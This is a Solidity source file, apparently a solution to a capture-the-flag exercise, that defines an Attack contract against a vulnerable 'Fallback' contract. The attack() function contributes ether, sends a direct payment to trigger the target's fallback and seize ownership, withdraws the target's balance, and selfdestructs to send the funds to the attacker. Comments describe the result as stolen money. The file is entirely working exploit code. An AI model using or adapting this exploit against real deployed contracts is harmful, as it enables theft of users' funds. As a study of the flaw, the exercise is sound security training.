// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Fallback.sol";

// hardhat consol log from a solidity contract

contract Attack {
    Fallback public fallbackContract;
    address payable owner;

    constructor(address payable _fallbackAddress) {
        fallbackContract = Fallback(_fallbackAddress);
        owner = payable(msg.sender);
    }

    function attack() public payable {
        // Contribue to fallback contract
        uint256 amount1 = msg.value / 2;
        uint256 amount2 = msg.value / 2;

        fallbackContract.contribute{value: amount1}();

        // send value to invoke fallback function (this allows me to becomme the owner)
        (bool sent, ) = address(fallbackContract).call{value: amount2}("");
        require(sent, "Failed to send eth");

        // call the withdraw function.
        fallbackContract.withdraw();

        selfdestruct(owner);
    }

    function withdraw() public {
        // withdraw the stolen money
        owner.transfer(address(this).balance);
    }

    receive() external payable {}
}
